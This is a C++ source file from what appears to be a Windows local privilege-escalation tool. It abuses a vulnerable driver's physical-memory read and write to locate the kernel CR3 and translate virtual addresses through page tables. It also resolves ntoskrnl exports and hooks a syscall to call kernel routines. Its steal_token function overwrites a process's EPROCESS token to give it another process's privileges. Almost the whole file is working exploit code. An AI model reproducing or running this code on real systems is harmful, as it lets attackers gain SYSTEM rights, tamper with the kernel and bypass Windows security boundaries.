#include "vdm.hpp"
#include "pte.hpp"

#include <array>
#include <format>
#include <iostream>
#include <memory>
#include <string>

#pragma comment(lib, "ntdll.lib")

std::pair<const char*, const char*> physical_region = {
        R"(Hardware\ResourceMap\System Resources\Physical Memory)",
        ".Translated"
};

std::pair<const char*, const char*> reserved_region = {
        R"(Hardware\ResourceMap\System Resources\Reserved)",
        ".Translated"
};

std::pair<const char*, const char*> loader_region = {
        R"(Hardware\ResourceMap\System Resources\Loader Reserved)",
        ".Raw"
};

constexpr auto DUMMY_THREAD_EXIT_CODE = 0xDEADULL;
constexpr auto MAX_PARAMETERS_IN_REGS = 4;
constexpr auto MAX_PARAMETERS_COUNT = 9;

std::vector<std::pair<uint64_t, uint32_t>> vdm::get_memory_regions(const std::pair<const char*, const char*>& keys) {
    const auto [subkey, value] = keys;

    HKEY key;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &key) != ERROR_SUCCESS)
        return {};

    DWORD type = -1;
    DWORD size = -1;
    if (RegQueryValueExA(key, value, nullptr, &type, nullptr, &size) != ERROR_SUCCESS) {
        RegCloseKey(key);
        return {};
    }

    std::vector<uint8_t> data(size, '\0');
    RegQueryValueExA(key, value, nullptr, &type, data.data(), &size);

    if (type != REG_RESOURCE_LIST){
        RegCloseKey(key);
        return {};
    }

    const auto resource_list = reinterpret_cast<_CM_RESOURCE_LIST*>(data.data());
    std::vector<std::pair<uint64_t, uint32_t>> ranges {};
    for (auto i = 0; i < resource_list->Count; i++) {
        const auto& current_resource_descriptor = resource_list->List[i];
        for (auto j = 0; j < current_resource_descriptor.PartialResourceList.Count; j++) {
            const auto& current_partial_resource_descriptor = current_resource_descriptor.PartialResourceList.PartialDescriptors[j];
            const uint64_t start = current_partial_resource_descriptor.u.Memory.Start.QuadPart;
            uint64_t length = current_partial_resource_descriptor.u.Memory.Length;

            switch (current_partial_resource_descriptor.Type) {
                case CmResourceTypeMemory:
                    break;
                // https://stackoverflow.com/a/48486485
                case CmResourceTypeMemoryLarge: {
                    switch (current_partial_resource_descriptor.Flags & (CM_RESOURCE_MEMORY_LARGE_40 | CM_RESOURCE_MEMORY_LARGE_48 | CM_RESOURCE_MEMORY_LARGE_64)) {
                        case CM_RESOURCE_MEMORY_LARGE_40:
                            length <<= CM_RESOURCE_MEMORY_LARGE_40_SHIFT;
                            break;
                        case CM_RESOURCE_MEMORY_LARGE_48:
                            length <<= CM_RESOURCE_MEMORY_LARGE_48_SHIFT;
                            break;
                        case CM_RESOURCE_MEMORY_LARGE_64:
                            length <<= CM_RESOURCE_MEMORY_LARGE_64_SHIFT;
                            break;
                    default:
                        continue;
                    }
                }
                default:
                    continue;
            }
            #pragma warning(disable : 4244)
            ranges.emplace_back(start, length);
        }
    }

    RegCloseKey(key);
    return ranges;
};

std::vector<uint8_t> vdm::query_system_information(SYSTEM_INFORMATION_CLASS information_class) {
    ULONG size = 0;

    {
        std::array<uint8_t, 32> dummy_information {};
        NtQuerySystemInformation(information_class, dummy_information.data(), dummy_information.size(), &size);
    }

    std::vector<uint8_t> data(size, '\0');

    if (!NT_SUCCESS(NtQuerySystemInformation(information_class, data.data(), data.size(), &size))) {
        return {};
    }

    return data;
}

bool vdm::fetch_ntoskrnl_information(uint64_t& address, size_t& size) {
    const auto module_data = query_system_information(SystemModuleInformation);
    if (module_data.empty())
        return false;

    const auto system_modules = reinterpret_cast<const _RTL_PROCESS_MODULES*>(module_data.data());
    if (system_modules->NumberOfModules > 0) {
        // ntoskrnl.exe always first entry
        const auto Module = &system_modules->Modules[0];

        address = reinterpret_cast<uint64_t>(Module->ImageBase);
        size = Module->ImageSize;

        return true;
    }

    return false;
}

uint64_t vdm::fetch_ntoskrnl_export(const std::string& name) {
    IMAGE_DOS_HEADER dos_header;
    if (!read(ntoskrnl_cr3, ntoskrnl_image_base, &dos_header, sizeof(dos_header)))
        return 0;

    if (dos_header.e_magic != IMAGE_DOS_SIGNATURE)
        return 0;

    IMAGE_NT_HEADERS64 nt_headers;
    if (!read(ntoskrnl_cr3, ntoskrnl_image_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)))
        return 0;

    if (nt_headers.Signature != IMAGE_NT_SIGNATURE)
        return 0;

    const auto export_directory_entry = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!export_directory_entry.VirtualAddress)
        return 0;

    std::vector<uint8_t> export_data(export_directory_entry.Size, '\0');
    const auto export_directory = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(export_data.data());
    if (!read(ntoskrnl_cr3, ntoskrnl_image_base + export_directory_entry.VirtualAddress, export_data.data(), export_data.size())) {
        free(export_directory);
        return 0;
    }

    const auto delta = reinterpret_cast<uint64_t>(export_directory) - export_directory_entry.VirtualAddress;

    const auto function_table = reinterpret_cast<uint32_t*>(export_directory->AddressOfFunctions + delta);
    const auto ordinals_table = reinterpret_cast<uint16_t*>(export_directory->AddressOfNameOrdinals + delta);
    const auto name_table = reinterpret_cast<uint32_t*>(export_directory->AddressOfNames + delta);

    for (auto i = 0; i < export_directory->NumberOfFunctions; ++i) {
        const auto function_name = reinterpret_cast<const char*>(name_table[i] + delta);

        if (reinterpret_cast<uint64_t>(function_name) < reinterpret_cast<uint64_t>(export_directory) ||
            reinterpret_cast<uint64_t>(function_name) > reinterpret_cast<uint64_t>(export_directory) + export_directory_entry.Size) {
            // TODO: handle forwarded exports

            continue;
        }

        if (_stricmp(function_name, name.data()) == 0) {
            return ntoskrnl_image_base + function_table[ordinals_table[i]];
        }
    }

    return 0;
}

uint64_t vdm::fetch_ntoskrnl_cr3() {
    const auto memory_ranges = get_memory_regions(physical_region);

    if (!sys_info.lpMaximumApplicationAddress)
        GetSystemInfo(&sys_info);

    std::vector<uint8_t> page_data(sys_info.dwPageSize, '\0');

    for (const auto& [start, size] : memory_ranges) {
        const auto end = start + size;
        for (auto address = start; address < end && address < PROCESSOR_START_BLOCK_MAX; address += sys_info.dwPageSize) {
            if (vuln_driver->read(address, page_data.data(), page_data.size())) {
                for (auto i = 0; i < (sys_info.dwPageSize - sizeof(_PROCESSOR_START_BLOCK)); ++i) {
                    const auto psb = reinterpret_cast<_PROCESSOR_START_BLOCK*>(page_data.data() + i);

                    // https://namazso.github.io/x86/html/JMP.html
                    // x64 Jump near, relative
                    if (psb->Jmp.OpCode == 0xE9 &&
                        psb->CompletionFlag == TRUE &&
                        psb->ProcessorState.SpecialRegisters.Cr3 != 0 &&
                        psb->LmTarget != nullptr) {
                        std::cout << std::format("[*] Found PROCESSOR_START_BLOCK: 0x{:X}", (uint64_t)psb) << std::endl;
                        return psb->ProcessorState.SpecialRegisters.Cr3;
                    }
                }
            }
        }
    }

    return 0;
}

bool vdm::virtual_to_physical(uint64_t cr3, uint64_t address, uint64_t& physical_address, uint64_t& page_size, uint64_t& page_offset) {
    const auto pml4_address = PML4_ADDRESS(cr3) + PML4_INDEX(address) * sizeof(uint64_t);

    PML4E_64 pml4e;
    if (!vuln_driver->read(pml4_address, &pml4e.AsUInt, sizeof(pml4e)))
        return false;

    if (!pml4e.Present)
        return false;

    const auto pdpte_address = PFN_TO_PAGE(pml4e.PageFrameNumber) + PDPT_INDEX(address) * sizeof(uint64_t);

    PDPTE_64 pdpte;
    if (!vuln_driver->read(pdpte_address, &pdpte.AsUInt, sizeof(pdpte)))
        return false;

    if (!pdpte.Present)
        return false;

    if (pdpte.LargePage) {
        // PDPTE is 1GB, treat it as such
        const auto page_offset_1gb = PAGE_OFFSET_1G(address);
        const auto pdpte_1gb = *reinterpret_cast<PDPTE_1GB_64*>(&pdpte);
        physical_address = PFN_TO_PAGE(pdpte_1gb.PageFrameNumber) + page_offset_1gb;
        page_offset = page_offset_1gb;
        page_size = PAGE_1GB;

        return true;
    }

    const auto pde_address = PFN_TO_PAGE(pdpte.PageFrameNumber) + PDE_INDEX(address) * sizeof(uint64_t);

    PDE_64 pde;
    if (!vuln_driver->read(pde_address, &pde.AsUInt, sizeof(pde)))
        return false;

    if (!pde.Present)
        return false;

    if (pde.LargePage) {
        // PDE is 2MB, treat it as such
        const auto page_offset_2mb = PAGE_OFFSET_2M(address);
        const auto pde_2mb = *reinterpret_cast<PDE_2MB_64*>(&pde);
        physical_address = PFN_TO_PAGE(pde.PageFrameNumber) + page_offset_2mb;
        page_offset = page_offset_2mb;
        page_size = PAGE_2MB;

        return true;
    }

    const auto pte_address = PFN_TO_PAGE(pde.PageFrameNumber) + PTE_INDEX(address) * sizeof(uint64_t);

    PTE_64 pte;
    if (!vuln_driver->read(pte_address, &pte.AsUInt, sizeof(pte)))
        return false;

    if (!pte.Present)
        return false;

    const auto page_offset_4kb = PAGE_OFFSET_4K(address);
    physical_address = PFN_TO_PAGE(pte.PageFrameNumber) + page_offset_4kb;
    page_offset = page_offset_4kb;
    page_size = PAGE_4KB;

    return true;
}

bool vdm::read(uint64_t cr3, uint64_t address, void* buffer, size_t size) {
    const auto end = address + size;

    while (address < end) {
        uint64_t physical_address;
        uint64_t page_size;
        uint64_t page_offset;

        if (!virtual_to_physical(cr3, address, physical_address, page_size, page_offset))
            return false;

        const auto remaining = end - address;
        auto chunk_size = page_size - page_offset;

        chunk_size = chunk_size > remaining ? remaining : chunk_size;

        if (!vuln_driver->read(physical_address, buffer, chunk_size))
            return false;

        buffer = reinterpret_cast<uint8_t*>(buffer) + chunk_size;
        address = address + chunk_size;
    }

    return true;
}

bool vdm::write(uint64_t cr3, uint64_t address, const void* buffer, size_t size) {
    const uint64_t end = address + size;

    while (address < end) {
        uint64_t physical_address;
        uint64_t page_size;
        uint64_t page_offset;

        if (!virtual_to_physical(cr3, address, physical_address, page_size, page_offset))
            return false;

        const auto remaining = end - address;
        auto chunk_size = page_size - page_offset;

        chunk_size = chunk_size > remaining ? remaining : chunk_size;

        if (!vuln_driver->write(physical_address, buffer, chunk_size))
            return false;

        buffer = reinterpret_cast<const uint8_t*>(buffer) + chunk_size;
        address = address + chunk_size;
    }

    return true;
}

bool vdm::initialize() {
    if (vuln_driver == nullptr)
        return false;

    RTL_OSVERSIONINFOEXW version_info {
            sizeof(version_info)
    };

    if (NT_ERROR(RtlGetVersion(&version_info)))
        return false;

    // check for windows 10 1709+
    if (!(version_info.dwMajorVersion == 10 && version_info.dwBuildNumber >= 1709))
        return false;

    do {
        ntoskrnl_cr3 = fetch_ntoskrnl_cr3();
        if (!ntoskrnl_cr3)
            break;

        std::cout << std::format("[*] ntoskrnl.exe CR3: 0x{:X}", ntoskrnl_cr3) << std::endl;

        if (!fetch_ntoskrnl_information(ntoskrnl_image_base, ntoskrnl_image_size))
            break;

        std::cout << std::format("[*] ntoskrnl.exe base address: 0x{:X}", ntoskrnl_image_base) << std::endl;
        std::cout << std::format("[*] ntoskrnl.exe image size: 0x{:X}", ntoskrnl_image_size) << std::endl;

        ntoskrnl_module = (uint64_t)LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (ntoskrnl_module == 0)
            break;

        const auto ps_initial_system_process = fetch_ntoskrnl_export("PsInitialSystemProcess");
        if (!read(ntoskrnl_cr3, ps_initial_system_process, &ntoskrnl_eprocess, sizeof(ntoskrnl_eprocess)))
            break;

        uint64_t system_pid = {};
        if (!read(ntoskrnl_cr3, ntoskrnl_eprocess + offsets::EProcess::UniqueProcessId, &system_pid, sizeof(VOID*)))
            break;

        if (system_pid != SYSTEM_PID)
            break;

        const auto [syscall_name, module] = syscall_hook;
        syscall_address = fetch_ntoskrnl_export(syscall_name);
        if (!syscall_address)
            break;

        return true;
    } while (false);

    ntoskrnl_cr3 = 0;
    ntoskrnl_image_base = 0;
    ntoskrnl_image_size = 0;
    ntoskrnl_module = 0;
    syscall_address = 0;

    return false;
}

uint64_t vdm::fetch_e_process(uint64_t pid) {
    const static auto ps_lookup_process_by_id = vdm::fetch_ntoskrnl_export("PsLookupProcessByProcessId");

    using ps_lookup_process_by_process_id = NTSTATUS (*)(HANDLE ProcessId, uint64_t* Process);
    uint64_t e_process = 0;
    const auto result = syscall<ps_lookup_process_by_process_id>(
            (void*)(ps_lookup_process_by_id),
            *reinterpret_cast<HANDLE*>(&pid),
            &e_process
    );

    return e_process;
}

bool vdm::steal_token(uint64_t victim_e_process, uint64_t target_e_process) {
    if (!target_e_process || !victim_e_process)
        return false;

    _EX_FAST_REF victim_process_token {};
    if (!read(ntoskrnl_cr3, victim_e_process + offsets::EProcess::Token, &victim_process_token, sizeof(_EX_FAST_REF))) {
        std::cout << "[!] Failed to read current process token" << std::endl;
        return false;
    }

    _EX_FAST_REF target_process_token {};
    if (!read(ntoskrnl_cr3, target_e_process + offsets::EProcess::Token, &target_process_token, sizeof(_EX_FAST_REF))) {
        std::cout << "[!] Failed to read target process token" << std::endl;
        return false;
    }

    constexpr uint64_t TOKEN_MASK = 0xF;

    const auto victim_ref_count = reinterpret_cast<uint64_t>(victim_process_token.Object) & TOKEN_MASK;
    const auto target_ref_count = reinterpret_cast<uint64_t>(target_process_token.Object) & TOKEN_MASK;

    std::cout << std::format("[*] Victim reference count: {}", victim_ref_count) << std::endl;
    std::cout << std::format("[*] Target reference count: {}", target_ref_count) << std::endl;

    const auto victim_token_address = reinterpret_cast<uint64_t>(victim_process_token.Object) & (UINT64_MAX - TOKEN_MASK);
    auto target_token_address = reinterpret_cast<uint64_t>(target_process_token.Object) & (UINT64_MAX - TOKEN_MASK);

    std::cout << std::format("[*] Victim token address: 0x{:X}", victim_token_address) << std::endl;
    std::cout << std::format("[*] Target token address: 0x{:X}", target_token_address) << std::endl;

    target_process_token.Value = victim_process_token.Value;

    if (!write(ntoskrnl_cr3, target_e_process + offsets::EProcess::Token, &target_process_token, sizeof(_EX_FAST_REF))) {
        std::cout << "[!] Failed to write target process token to current process" << std::endl;
        return false;
    }

    if (!read(ntoskrnl_cr3, target_e_process + offsets::EProcess::Token, &target_process_token, sizeof(_EX_FAST_REF))) {
        std::cout << "[!] Failed to read target process token" << std::endl;
        return false;
    }

    target_token_address = reinterpret_cast<uint64_t>(target_process_token.Object) & (UINT64_MAX - TOKEN_MASK);
    std::cout << std::format("[*] New target token address: 0x{:X}", target_token_address) << std::endl;

    return true;
}
